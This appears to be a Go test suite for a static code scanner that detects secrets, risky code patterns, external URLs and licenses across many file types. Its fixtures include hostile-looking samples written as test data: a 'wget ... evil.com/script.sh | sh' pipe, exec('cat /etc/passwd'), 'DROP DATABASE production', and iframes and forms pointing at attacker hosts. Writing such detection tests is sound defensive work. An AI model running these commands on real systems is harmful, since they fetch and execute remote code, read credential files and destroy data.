package codescan

import (
	"encoding/base64"
	"encoding/json"
	"strings"
	"testing"
	"time"
)

// TestSecretOfflineVerificationSurfaced proves the offline structural check
// reaches the report: an expired JWT is demoted and annotated as inactive.
func TestSecretOfflineVerificationSurfaced(t *testing.T) {
	enc := base64.RawURLEncoding
	header, _ := json.Marshal(map[string]any{"alg": "HS256", "typ": "JWT"})
	claims, _ := json.Marshal(map[string]any{"exp": float64(time.Now().Add(-24 * time.Hour).Unix())})
	jwt := enc.EncodeToString(header) + "." + enc.EncodeToString(claims) + ".c2ln"

	res := Scan("config.txt", "text", []byte("auth = \""+jwt+"\""))
	var found bool
	for _, f := range res.Findings {
		if f.ID == "secret/jwt-token" {
			found = true
			if !strings.Contains(strings.ToLower(f.Detail), "inactive/expired") {
				t.Errorf("expired JWT detail should note it is inactive/expired, got %q", f.Detail)
			}
		}
	}
	if !found {
		t.Error("expected a JWT secret finding")
	}
}

func TestScanURLs(t *testing.T) {
	tests := []struct {
		name       string
		input      string
		wantHost   string
		shouldFind bool
	}{
		{
			name:       "valid standard url",
			input:      "http://api.example.com/v1/auth",
			wantHost:   "api.example.com",
			shouldFind: true,
		},
		{
			name:       "sensitive host detection",
			input:      "https://login.secure-service.net/redirect",
			wantHost:   "login.secure-service.net",
			shouldFind: true,
		},
		{
			name:       "android manifest namespace namespace",
			input:      `xmlns:android="http://schemas.android.com/apk/res/android"`,
			wantHost:   "schemas.android.com",
			shouldFind: false,
		},
		{
			name:       "w3c namespace",
			input:      `xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"`,
			wantHost:   "www.w3.org",
			shouldFind: false,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			findings := scanURLs("test_file.js", tt.input)
			found := false
			for _, f := range findings {
				if strings.Contains(f.Title, tt.wantHost) {
					found = true
					break
				}
			}
			if found != tt.shouldFind {
				t.Errorf("scanURLs() found = %v, want = %v for host %s", found, tt.shouldFind, tt.wantHost)
			}
		})
	}
}

func TestClassifiers(t *testing.T) {
	// Test looksMinified - Short
	if looksMinified("short") {
		t.Error("Expected short text to not look minified")
	}

	// Test looksMinified - Long normal
	normalText := strings.Repeat("This is a normal line of code with spaces.\n", 100)
	if looksMinified(normalText) {
		t.Error("Expected normal text to not look minified")
	}

	// Test looksMinified - Long minified (zero spaces)
	minifiedText := strings.Repeat("a", 5000)
	if !looksMinified(minifiedText) {
		t.Error("Expected minified text to look minified")
	}

	// Test looksObfuscated - Short
	if looksObfuscated("short") {
		t.Error("Expected short text to not look obfuscated")
	}

	// Test looksObfuscated - Long obfuscated
	hexObfuscated := strings.Repeat("ab12cd34", 1000)
	if !looksObfuscated(hexObfuscated) {
		t.Error("Expected high hex density text to look obfuscated")
	}
}

func TestScoreAndVerdict(t *testing.T) {
	fsCritical := []Finding{{Severity: SevCritical}}
	scoreVal, verdict := score(fsCritical)
	if scoreVal != 30 || verdict != "possible embedded payload" {
		t.Errorf("Score error: got %d, %s", scoreVal, verdict)
	}

	fsHigh := []Finding{{Severity: SevHigh}}
	scoreHigh, verdictHigh := score(fsHigh)
	if scoreHigh != 18 || verdictHigh != "potentially unsafe" {
		t.Errorf("Score error: got %d, %s", scoreHigh, verdictHigh)
	}

	fsMedium := []Finding{{Severity: SevMedium}}
	scoreMed, verdictMed := score(fsMedium)
	if scoreMed != 8 || verdictMed != "suspicious" {
		t.Errorf("Score error: got %d, %s", scoreMed, verdictMed)
	}
}

func TestScanLanguages(t *testing.T) {
	// 1. WASM Scanner - Truncated
	wasmTrunc := Scan("test.wasm", "wasm", []byte{0x00})
	if len(wasmTrunc.Findings) == 0 || wasmTrunc.Findings[0].ID != "wasm/truncated" {
		t.Error("Expected wasm/truncated finding")
	}

	// WASM Scanner - Bad Magic
	wasmMGC := Scan("test.wasm", "wasm", []byte("badmagic"))
	if len(wasmMGC.Findings) == 0 || wasmMGC.Findings[0].ID != "wasm/bad-magic" {
		t.Error("Expected wasm/bad-magic finding")
	}

	// WASM Scanner - Valid with mock sections
	// Magic + Version + Section 2 (size 1) + Section 7 (size 1)
	wasmValid := []byte{
		0x00, 'a', 's', 'm',
		0x01, 0x00, 0x00, 0x00,
		0x02, 0x01, 0x00,
		0x07, 0x01, 0x00,
	}
	wasmRes := Scan("test.wasm", "wasm", wasmValid)
	if len(wasmRes.Findings) < 2 {
		t.Errorf("Expected symbols and imports findings, got %d", len(wasmRes.Findings))
	}

	// 2. JavaScript / TypeScript
	jsPayload := `
		const url = "http://api.evil.com";
		const key = "AIzaSyD-mock-key";
		eval("console.log(1)");
		document.write(url);
		window.location = "javascript:alert(1)";
	`
	jsRes := Scan("test.js", "javascript", []byte(jsPayload))
	if len(jsRes.Findings) == 0 {
		t.Error("Expected findings in JS payload")
	}

	// 3. HTML
	htmlPayload := `
		<html>
			<iframe src="javascript:alert(1)"></iframe>
			<script>eval(x)</script>
		</html>
	`
	htmlRes := Scan("test.html", "html", []byte(htmlPayload))
	if len(htmlRes.Findings) == 0 {
		t.Error("Expected findings in HTML payload")
	}

	// 4. CSS
	cssPayload := `
		body {
			behavior: url(x);
			width: expression(1);
		}
	`
	cssRes := Scan("test.css", "css", []byte(cssPayload))
	if len(cssRes.Findings) == 0 {
		t.Error("Expected findings in CSS payload")
	}

	// 5. Protobuf Schema
	protoPayload := `
		syntax = "proto3";
		package com.app.protobuf;
		import "other.proto";
		message UserInfo {
			string name = 1;
			int32 age = 2;
		}
		enum Role {
			USER = 0;
			ADMIN = 1;
		}
		service UserService {
			rpc GetUser(UserInfo) returns (UserInfo);
		}
	`
	protoRes := Scan("test.proto", "proto", []byte(protoPayload))
	if protoRes.Schema == nil {
		t.Fatal("Expected parsed Protobuf schema")
	}
	if protoRes.Schema.Package != "com.app.protobuf" {
		t.Errorf("Expected package com.app.protobuf, got %s", protoRes.Schema.Package)
	}
	if len(protoRes.Schema.Messages) != 1 || protoRes.Schema.Messages[0] != "UserInfo" {
		t.Error("Expected parsed UserInfo message")
	}
	if len(protoRes.Schema.Services) != 1 || protoRes.Schema.Services[0].Name != "UserService" {
		t.Error("Expected parsed UserService service")
	}

	// 6. JSON
	jsonPayload := `
		{
			"aws_key": "AKIA1234567890123456",
			"secret": "---BEGIN RSA PRIVATE KEY---"
		}
	`
	jsonRes := Scan("test.json", "json", []byte(jsonPayload))
	if len(jsonRes.Findings) == 0 {
		t.Error("Expected findings in JSON payload")
	}

	// 7. Lua, Python, Shell, SQL, Smali
	Scan("test.lua", "lua", []byte(`os.execute("sh")`))
	Scan("test.py", "python", []byte(`subprocess.Popen("sh")`))
	Scan("test.sh", "shell", []byte(`eval "$x"`))
	Scan("test.sql", "sql", []byte(`SELECT * FROM users WHERE name = '`))
	Scan("test.smali", "smali", []byte(`const-string v0, "secret"`))
}

func TestBinaryAndBOM(t *testing.T) {
	// Invalid UTF-8 binary
	binaryBytes := []byte{0x80, 0x81, 0x82, 0xff}
	res := Scan("binary.txt", "text", binaryBytes)
	foundBinaryHit := false
	for _, f := range res.Findings {
		if f.ID == "code/binary-as-text" {
			foundBinaryHit = true
		}
	}
	if !foundBinaryHit {
		t.Error("Expected binary-as-text warning")
	}

	// BOM strip check
	bomBytes := append([]byte("\uFEFF"), []byte("hello")...)
	bomRes := Scan("bom.txt", "text", bomBytes)
	if bomRes.Bytes != int64(len(bomBytes)) {
		t.Error("Expected BOM bytes to be logged correctly")
	}
}

func TestIsSensitiveHost(t *testing.T) {
	if !isSensitiveHost("auth.secure.com") {
		t.Error("Expected auth.secure.com to be classified as sensitive")
	}
	if isSensitiveHost("google.com") {
		t.Error("Expected google.com to not be classified as sensitive")
	}
}

func TestGoogleAPITriage(t *testing.T) {
	// Google API key in standard Firebase config (exact 39-character key: AIza + 35 chars)
	fbPayload := `
		google_api_key = "AIzaSyD-mock-firebase-key-1234567890123"
		firebase = true
	`
	resFB := Scan("google-services.json", "text", []byte(fbPayload))
	foundFB := false
	for _, f := range resFB.Findings {
		if f.ID == "secret/google-api" && f.Severity == SevInfo {
			foundFB = true
		}
	}
	if !foundFB {
		t.Error("Expected public Firebase key to have Info severity")
	}

	// Google API key with active Maps paid abuse risk keywords (exact 39-character key: AIza + 35 chars)
	mapsPayload := `
		api_key = "AIzaSyD-mock-active-maps-key-1234567890"
		maps = true
		billing = true
	`
	resMaps := Scan("config.txt", "text", []byte(mapsPayload))
	foundMaps := false
	for _, f := range resMaps.Findings {
		if f.ID == "secret/google-api" && f.Severity == SevHigh {
			foundMaps = true
		}
	}
	if !foundMaps {
		t.Error("Expected Maps key with billing keywords to have High severity")
	}
}

func TestLicenseCompliance(t *testing.T) {
	gplText := "This software is licensed under the GNU General Public License."

	// Safe/info doc folder GPL
	resDoc := Scan("/docs/README.md", "text", []byte(gplText))
	foundDocGPL := false
	for _, f := range resDoc.Findings {
		if f.ID == "license/gpl" && f.Severity == SevInfo {
			foundDocGPL = true
		}
	}
	if !foundDocGPL {
		t.Error("Expected GPL in documentation to have Info severity")
	}

	// High risk native folder GPL
	resNative := Scan("/lib/my_component/LICENSE.txt", "text", []byte(gplText))
	foundNativeGPL := false
	for _, f := range resNative.Findings {
		if f.ID == "license/gpl" && f.Severity == SevHigh {
			foundNativeGPL = true
		}
	}
	if !foundNativeGPL {
		t.Error("Expected GPL in native lib to have High severity")
	}

	// Test LGPL, Apache, MIT, BSD
	Scan("LICENSE.txt", "text", []byte("Lesser General Public License"))
	Scan("LICENSE.txt", "text", []byte("Apache License"))
	Scan("LICENSE.txt", "text", []byte("MIT License"))
	Scan("LICENSE.txt", "text", []byte("BSD 3-Clause"))
}

func TestHexHash(t *testing.T) {
	if hexHash([]byte("test")) != "74657374" {
		t.Errorf("Expected 74657374, got %s", hexHash([]byte("test")))
	}
}

func TestClassifiersEdgeCases(t *testing.T) {
	// looksMinified - maxLine < 800
	textShortLines := strings.Repeat("abc\n", 600) // length > 2048, but max line length is 3
	if looksMinified(textShortLines) {
		t.Error("Expected text with short lines not to look minified")
	}

	// looksMinified - maxLine >= 800 but ratio >= 0.05
	textLongLinesWithSpaces := strings.Repeat(" ", 500) + strings.Repeat("a ", 1000) + "\n"
	if looksMinified(textLongLinesWithSpaces) {
		t.Error("Expected text with high space density not to look minified")
	}

	// looksObfuscated - hexRatio > 0.85
	obfHexText := strings.Repeat("1234567890abcdefABCDEF", 300) // len > 4096, all hex
	if !looksObfuscated(obfHexText) {
		t.Error("Expected highly hex-dense text to look obfuscated")
	}

	// looksObfuscated - \\x count > 200
	obfSlashXText := strings.Repeat("\\x12", 210) + strings.Repeat("a", 4000)
	if !looksObfuscated(obfSlashXText) {
		t.Error("Expected text with many \\x escapes to look obfuscated")
	}

	// looksObfuscated - normal text
	normalObfText := strings.Repeat("This is perfectly normal text without hex bias. ", 150)
	if looksObfuscated(normalObfText) {
		t.Error("Expected normal text not to look obfuscated")
	}
}

func TestFrameworkSuppression(t *testing.T) {
	frameworks := []string{
		"my-react-app.js",
		"core-js-polyfill.js",
		"vendor.webpack.js",
		"app.bundle.js",
	}

	jsPayload := `
		dangerouslySetInnerHTML = true;
		document.write("x");
		eval("alert(1)");
		new Function("console.log(1)");
		setTimeout("console.log(1)", 100);
		Object.prototype.polluted = 1;
		const key = "createCipher('des'";
		postMessage("messagechannel");
	`

	for _, fw := range frameworks {
		res := Scan(fw, "javascript", []byte(jsPayload))
		if len(res.Findings) == 0 {
			t.Errorf("Expected findings for framework %s", fw)
		}
		// Assert that react-danger, document-write, etc. are downgraded or present
		foundDanger := false
		for _, f := range res.Findings {
			if f.ID == "js/react-danger" {
				foundDanger = true
				if f.Severity != SevInfo {
					t.Errorf("Expected dangerouslySetInnerHTML severity to be info in framework, got %s", f.Severity)
				}
			}
			if f.ID == "js/eval" && f.Severity != SevLow {
				t.Errorf("Expected eval severity to be low in framework, got %s", f.Severity)
			}
		}
		if !foundDanger && strings.Contains(fw, "react") {
			t.Error("Expected to find dangerouslySetInnerHTML finding")
		}
	}
}

func TestRNAppBundleNotSuppressed(t *testing.T) {
	// The same eval that is down-ranked in a vendor framework chunk must stay
	// HIGH in the app's own React Native bundle — it is application code.
	payload := `eval("alert(1)"); addJavascriptInterface(obj, "bridge");`

	appBundle := Scan("assets/index.android.bundle", "bundle", []byte(payload))
	var appEvalSev string
	for _, f := range appBundle.Findings {
		if f.ID == "js/eval" {
			appEvalSev = f.Severity
		}
	}
	if appEvalSev != SevHigh {
		t.Errorf("eval in index.android.bundle must stay high (app code), got %q", appEvalSev)
	}

	// Sanity: a vendor framework bundle still suppresses it.
	vendor := Scan("assets/vendor.bundle.js", "bundle", []byte(payload))
	for _, f := range vendor.Findings {
		if f.ID == "js/eval" && f.Severity == SevHigh {
			t.Error("eval in vendor framework bundle should be down-ranked, not high")
		}
	}
}

func TestWebViewAndTLSRules(t *testing.T) {
	cases := []struct {
		code string
		id   string
	}{
		{`webView.getSettings().setAllowUniversalAccessFromFileURLs(true);`, "js/webview-universal-access"},
		{`settings.setAllowFileAccess(true);`, "js/webview-file-access"},
		{`<WebView injectedJavaScript={code} />`, "js/webview-inject"},
		{`cordova.exec(success, fail, "Plugin", "action", []);`, "js/cordova-exec"},
		{`const agent = new https.Agent({ rejectUnauthorized: false });`, "js/tls-disabled"},
		{`process.env.NODE_TLS_REJECT_UNAUTHORIZED = "0";`, "js/tls-disabled"},
	}
	for _, c := range cases {
		res := Scan("app.js", "javascript", []byte(c.code))
		found := false
		for _, f := range res.Findings {
			if f.ID == c.id {
				found = true
				break
			}
		}
		if !found {
			t.Errorf("expected %s for code: %s", c.id, c.code)
		}
	}
}

func TestProcessExecParameterFalsePositives(t *testing.T) {
	cases := []struct {
		code      string
		shouldHit bool
	}{
		{"child_process.exec()", true},
		{"function exec(cmd) {}", false},
		{"const f = (exec) => {};", false},
		{"const f = (exec)={};", false},
		{"{ exec: 'val' }", false},
		{"run(a, exec, b)", false},
		{"run(a,exec,b)", false},
		{"run(exec, b)", false},
		{"run(a, exec )", true},
		{"function(exec)", false},
		{"function (exec)", false},
	}

	for i, tc := range cases {
		// We prepend dynamic import to activate HIGH/LOW paths of js/exec
		payload := `const cp = require("child_process"); ` + tc.code
		res := Scan("test.js", "javascript", []byte(payload))
		found := false
		for _, f := range res.Findings {
			if f.ID == "js/exec" {
				found = true
			}
		}
		if found != tc.shouldHit {
			t.Errorf("Case %d: expected hit %v, got %v for code: %s", i, tc.shouldHit, found, tc.code)
		}
	}

	// Test exec without child_process import -> should be SevLow
	resNoImport := Scan("test.js", "javascript", []byte("exec('cat /etc/passwd')"))
	foundLow := false
	for _, f := range resNoImport.Findings {
		if f.ID == "js/exec" && f.Severity == SevLow {
			foundLow = true
		}
	}
	if !foundLow {
		t.Error("Expected js/exec without child_process import to have Low severity")
	}
}

func TestHTMLScannersEdgeCases(t *testing.T) {
	htmlPayload := `
		<html>
			<iframe src="https://attacker.com/leak"></iframe>
			<form action="https://evil.com/submit"></form>
			<script>console.log("This is a large inline script that exceeds fifty characters of length!");</script>
			<meta http-equiv="refresh" url="https://evil.com">
			<object data="https://evil.com/payload.swf"></object>
			<embed data="https://evil.com/payload.svg"></embed>
			<img src="data:image/png;base64,` + strings.Repeat("A", 250) + `">
			<div onmouseover="leak()"></div>
		</html>
	`
	res := Scan("index.html", "html", []byte(htmlPayload))
	expectedIDs := []string{
		"html/iframe-external",
		"html/form-external",
		"html/inline-script",
		"html/meta-refresh",
		"html/object-embed",
		"html/data-uri-payload",
		"html/inline-event",
	}

	for _, id := range expectedIDs {
		found := false
		for _, f := range res.Findings {
			if f.ID == id {
				found = true
				break
			}
		}
		if !found {
			t.Errorf("Expected HTML finding: %s", id)
		}
	}
}

func TestCSSScannersEdgeCases(t *testing.T) {
	cssPayload := `
		@import url("https://evil.com/style.css");
		body {
			background: url("https://malicious.com/image.png");
			behavior: url(#default#homepage);
		}
	`
	res := Scan("style.css", "css", []byte(cssPayload))
	expectedIDs := []string{
		"css/external-import",
		"css/external-url",
	}
	for _, id := range expectedIDs {
		found := false
		for _, f := range res.Findings {
			if f.ID == id {
				found = true
				break
			}
		}
		if !found {
			t.Errorf("Expected CSS finding: %s", id)
		}
	}
}

func TestJSONScannersEdgeCases(t *testing.T) {
	jsonPayload := `
		{
			"jwt": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c",
			"blob": "` + strings.Repeat("A", 220) + `"
		}
	`
	res := Scan("config.json", "json", []byte(jsonPayload))
	expectedIDs := []string{
		"json/jwt",
		"json/blob",
	}
	for _, id := range expectedIDs {
		found := false
		for _, f := range res.Findings {
			if f.ID == id {
				found = true
				break
			}
		}
		if !found {
			t.Errorf("Expected JSON finding: %s", id)
		}
	}
}

func TestLuaScannersEdgeCases(t *testing.T) {
	luaPayload := `
		loadstring("print('hello')")()
		load("print('world')")()
		io.popen("ls")
	`
	res := Scan("script.lua", "lua", []byte(luaPayload))
	expectedIDs := []string{
		"lua/load",
		"lua/os-exec",
	}
	for _, id := range expectedIDs {
		found := false
		for _, f := range res.Findings {
			if f.ID == id {
				found = true
				break
			}
		}
		if !found {
			t.Errorf("Expected Lua finding: %s", id)
		}
	}
}

func TestPythonScannersEdgeCases(t *testing.T) {
	pyPayload := `
		eval("1+1")
		compile("1+1", "src", "eval")
		subprocess.run(["ls"])
		os.system("ls")
		pickle.loads(b"data")
	`
	res := Scan("script.py", "python", []byte(pyPayload))
	expectedIDs := []string{
		"py/exec",
		"py/subprocess",
		"py/os-cmd",
		"py/pickle",
	}
	for _, id := range expectedIDs {
		found := false
		for _, f := range res.Findings {
			if f.ID == id {
				found = true
				break
			}
		}
		if !found {
			t.Errorf("Expected Python finding: %s", id)
		}
	}
}

func TestShellScannersEdgeCases(t *testing.T) {
	shPayload := `
		source /etc/profile
		. /etc/profile
		wget -qO- http://evil.com/script.sh | sh
		chmod +x my_binary
	`
	res := Scan("script.sh", "shell", []byte(shPayload))
	expectedIDs := []string{
		"sh/eval",
		"sh/curl-pipe-sh",
		"sh/chmod-x",
	}
	for _, id := range expectedIDs {
		found := false
		for _, f := range res.Findings {
			if f.ID == id {
				found = true
				break
			}
		}
		if !found {
			t.Errorf("Expected Shell finding: %s", id)
		}
	}
}

func TestSQLScannersEdgeCases(t *testing.T) {
	sqlPayload := `
		SELECT * FROM users WHERE id = + $id;
		DROP DATABASE production;
	`
	res := Scan("query.sql", "sql", []byte(sqlPayload))
	expectedIDs := []string{
		"sql/string-concat",
		"sql/drop",
	}
	for _, id := range expectedIDs {
		found := false
		for _, f := range res.Findings {
			if f.ID == id {
				found = true
				break
			}
		}
		if !found {
			t.Errorf("Expected SQL finding: %s", id)
		}
	}
}

func TestSmaliScannersEdgeCases(t *testing.T) {
	smaliPayload := `
		Ljava/lang/reflect/Method;->invoke
		Ljava/lang/Class;->forName
		Ljava/lang/System;->loadLibrary
		"android.intent.action.BOOT_COMPLETED"
	`
	res := Scan("code.smali", "smali", []byte(smaliPayload))
	expectedIDs := []string{
		"smali/reflection-invoke",
		"smali/class-forname",
		"smali/native-library-load",
		"smali/intent-filter-action",
	}
	for _, id := range expectedIDs {
		found := false
		for _, f := range res.Findings {
			if f.ID == id {
				found = true
				break
			}
		}
		if !found {
			t.Errorf("Expected Smali finding: %s", id)
		}
	}
}

func TestSecretsAllTypes(t *testing.T) {
	payload := `
		aws_key = "AKIA1234567890123456"
		github = "ghp_123456789012345678901234567890123456"
		slack = "xoxb-1234567890-1234567890"
		stripe = "sk_live_12345678901234567890"
		facebook = "EAACEdEose0cBA1234567890"
		bearer = "bearer 12345678901234567890"
		pem_key = "-----BEGIN RSA PRIVATE KEY-----"
		generic_secret = "api-key: 'abcdef1234567890'"
	`
	res := Scan("test.js", "javascript", []byte(payload))
	expectedIDs := []string{
		"secret/aws-access-key",
		"secret/github-token",
		"secret/slack-token",
		"secret/stripe-key",
		"secret/facebook-token",
		"secret/bearer",
		"secret/private-key",
		"secret/keyword",
	}

	for _, id := range expectedIDs {
		found := false
		for _, f := range res.Findings {
			if f.ID == id {
				found = true
				break
			}
		}
		if !found {
			t.Errorf("Expected secret finding: %s", id)
		}
	}
}

func TestGoogleAPITriageEdgeCases(t *testing.T) {
	// Google API key in Manifest/Config with no special paid flags -> Medium
	payloadMedium := `key = "AIzaSyD-mock-generic-config-key-1234567"`
	resMedium := Scan("AndroidManifest.xml", "text", []byte(payloadMedium))
	foundMedium := false
	for _, f := range resMedium.Findings {
		t.Logf("Medium test finding: ID=%s, Sev=%s, Title=%s, Detail=%s", f.ID, f.Severity, f.Title, f.Detail)
		if f.ID == "secret/google-api" && f.Severity == SevMedium {
			foundMedium = true
		}
	}
	if !foundMedium {
		t.Error("Expected generic API key in AndroidManifest to have Medium severity")
	}

	// Google API key in standard file with no config/manifest name -> High (default)
	payloadDefault := `key = "AIzaSyD-mock-generic-key-with-no-context-1"`
	resDefault := Scan("random.js", "javascript", []byte(payloadDefault))
	foundDefault := false
	for _, f := range resDefault.Findings {
		if f.ID == "secret/google-api" && f.Severity == SevHigh {
			foundDefault = true
		}
	}
	if !foundDefault {
		t.Error("Expected generic API key in JS file to default to High severity")
	}
}

func TestURLClassificationEdgeCases(t *testing.T) {
	cases := []struct {
		url       string
		wantClass string
	}{
		{"https://api.example.com/v1/auth/login", "Auth/OAuth"},
		{"https://metrics.example.com/track", "telemetry"},
		{"https://cdnjs.cloudflare.com/ajax/libs", "CDN"},
		{"https://github.com/some/repo/blob/master/LICENSE", "developer/docs/license links"},
		{"https://example.com/api/v2/get", "backend API"},
		{"https://example.com/dev/endpoint", "backend API"},
		{"https://example.com/something-else", "unknown"},
	}

	for _, tc := range cases {
		cls := classifyURL(tc.url)
		if cls != tc.wantClass {
			t.Errorf("classifyURL(%s) = %s; want %s", tc.url, cls, tc.wantClass)
		}
	}

	// Test URL comment downgrade: developers.google.com inside a comment in a non-license file
	resComment := Scan("main.js", "javascript", []byte(`// Link: https://developers.google.com/maps`))
	foundInfo := false
	for _, f := range resComment.Findings {
		if f.ID == "net/external-url" && f.Severity == SevInfo {
			foundInfo = true
		}
	}
	if !foundInfo {
		t.Error("Expected doc link in comment to be Info severity")
	}

	// Test regular dev endpoint detection -> should be Medium
	resDev := Scan("main.js", "javascript", []byte(`const url = "https://api.example.com/dev/endpoint"`))
	foundMed := false
	for _, f := range resDev.Findings {
		t.Logf("URL Dev test finding: ID=%s, Sev=%s, Title=%s, Detail=%s", f.ID, f.Severity, f.Title, f.Detail)
		if f.ID == "net/external-url" && f.Severity == SevMedium {
			foundMed = true
		}
	}
	if !foundMed {
		t.Error("Expected dev API url to be Medium severity")
	}
}

func TestProtoScannersEdgeCases(t *testing.T) {
	// Empty proto
	resEmpty := Scan("empty.proto", "proto", []byte(`// syntax = "proto3";`))
	foundEmpty := false
	for _, f := range resEmpty.Findings {
		if f.ID == "proto/empty" {
			foundEmpty = true
		}
	}
	if !foundEmpty {
		t.Error("Expected proto/empty finding for empty protobuf file")
	}

	// Large tags and reserved
	protoComplex := `
		syntax = "proto3";
		package com.test;
		message Custom {
			google.protobuf.Any details = 999999;
			reserved 100 to max;
		}
	`
	resComplex := Scan("complex.proto", "proto", []byte(protoComplex))
	expectedIDs := []string{
		"proto/any",
		"proto/large-tag",
		"proto/reserved-max",
	}
	for _, id := range expectedIDs {
		found := false
		for _, f := range resComplex.Findings {
			if f.ID == id {
				found = true
			}
		}
		if !found {
			t.Errorf("Expected proto finding: %s", id)
		}
	}
}

func TestWASMVarUintBoundariesAndErrors(t *testing.T) {
	// Truncated WASM
	resTrunc := scanWASM([]byte{0x00, 'a', 's', 'm'})
	if len(resTrunc) != 1 || resTrunc[0].ID != "wasm/truncated" {
		t.Error("Expected wasm/truncated")
	}

	// findWASMSection with readVarUint failure
	// Magic + Version + section ID (2) + invalid VarUint (all 0x80 bytes up to 10 bytes)
	badVarUintWASM := []byte{
		0x00, 'a', 's', 'm',
		0x01, 0x00, 0x00, 0x00,
		0x02,
		0x80, 0x80, 0x80, 0x80, 0x80, 0x80, 0x80, 0x80, 0x80, 0x80, 0x80,
	}
	resBadVar := scanWASM(badVarUintWASM)
	for _, f := range resBadVar {
		if f.ID == "wasm/imports" {
			t.Error("Did not expect to successfully parse imports section with bad VarUint")
		}
	}

	// readVarUint with exactly 10 bytes that terminate
	b10 := []byte{0x80, 0x80, 0x80, 0x80, 0x80, 0x80, 0x80, 0x80, 0x80, 0x7f}
	val, n := readVarUint(b10)
	if n != 10 {
		t.Errorf("Expected 10 bytes read, got %d", n)
	}
	if val == 0 {
		t.Error("Expected non-zero parsed value")
	}
}

func TestOversizedPayloadTruncation(t *testing.T) {
	largeData := make([]byte, MaxScanBytes+100)
	for i := range largeData {
		largeData[i] = 'a'
	}
	res := Scan("large.js", "javascript", largeData)
	if !res.Truncated {
		t.Error("Expected result to show truncated = true")
	}
	if res.Bytes != int64(MaxScanBytes+100) {
		t.Errorf("Expected original byte length to be preserved, got %d", res.Bytes)
	}
}

func TestBinaryPayloadTextWarning(t *testing.T) {
	binaryBytes := []byte{0xff, 0xfe, 0xfd, 0x00, 0x01}
	res := Scan("masquerading.txt", "text", binaryBytes)
	found := false
	for _, f := range res.Findings {
		if f.ID == "code/binary-as-text" {
			found = true
		}
	}
	if !found {
		t.Error("Expected code/binary-as-text finding")
	}
}

func TestLineColAndSnippetBoundaries(t *testing.T) {
	// Offset out of bounds
	line, col := lineCol("abc", 10)
	if line != 1 || col != 4 {
		t.Errorf("Expected 1, 4 for offset out of bounds, got %d, %d", line, col)
	}

	// snippetAt boundaries
	sNeg := snippetAt("abc", -10, 100)
	if sNeg != "abc" {
		t.Errorf("Expected abc, got %s", sNeg)
	}

	sLong := snippetAt(strings.Repeat("a", 500), 100, 300)
	if !strings.HasSuffix(sLong, "…") {
		t.Error("Expected long snippet to be truncated with ellipsis")
	}
}
